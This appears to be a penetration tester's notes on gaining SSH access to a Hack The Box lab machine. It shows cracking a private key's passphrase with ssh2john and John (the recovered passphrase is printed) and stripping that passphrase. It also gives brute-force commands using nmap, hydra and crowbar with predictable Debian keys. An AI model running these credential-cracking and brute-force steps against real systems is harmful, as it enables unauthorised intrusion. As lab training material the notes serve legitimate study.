# Initial Access

## SSH

! Make the Key into a format that John can work with.
python3 ssh2john.py id_rsa > key.john

! Use John and Rockyou to crack the passphrase for the Priv Key.
user1㉿kali)-[~/Documents/htb-facts]
└─$ ls
authorized_keys  hydra.restore  id_rsa  key.john


john --wordlist=/usr/share/wordlists/rockyou.txt key.john
Created directory: /home/user1/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_rsa)     
1g 0:00:06:18 DONE (2026-03-01 21:28) 0.002640g/s 8.448p/s 8.448c/s 8.448C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

! Use the Passphrase to see the user for the Priv Key:

ssh-keygen -y -f id_rsa  
Enter passphrase for "id_rsa": 
ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAINJwPYi5omOtlRsWvcRWL6yzzZQ9bcZKN/9oo5qU2d89 trivia@facts.htb

! Change the passphrase for the Priv Key. This will also show the comment. In this case it is the username.
ssh-keygen -p -f ~/.ssh/id_rsa
Enter old passphrase: 
!When prompted for the "new passphrase," just hit Enter twice to leave it blank.
Key has comment 'trivia@facts.htb'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.

! Regenerate the Public Key from a Private Key

ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/rsa.pub

### NMAP NSE Brute for SSH


sudo nmap 10.10.11.87 --script ssh-brute.nse

### Dictionary attack with Hydra

hydra ssh://10.10.11.87 -L usernames.txt -P passwords.txt

### Brute Force attack with MSF

https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d

### Brute Force with Predictable Private/Public Key

"On the Linux platform, the default maximum process ID is 32,768, resulting in a very small number of seed values being used for all PRNG operations."

Download the predicatable Pub/Priv keys from: https://github.com/g0tmi1k/debian-ssh/blob/master/README.md

Crowbar usage: 

Syntax: crowbar -b sshkey -s <TARGET_IP> -u <username> -k <path/to/private/key>

crowbar -b sshkey -s 10.10.11.87 -u root -k /home/user1/Downloads/dsa/1024

## SSH Priv Pub Key Pair
```
ssh-keygen -t ed25519 -f /tmp/newPrivPubKey -N "" -C sshUserName
cat /tmp/newPrivPubKey.pub

chmod 700 ~/.ssh
chmod 600 /tmp/newPrivPubKey
ssh -i /tmp/newPrivPubKey sshUserName@remote_host
```
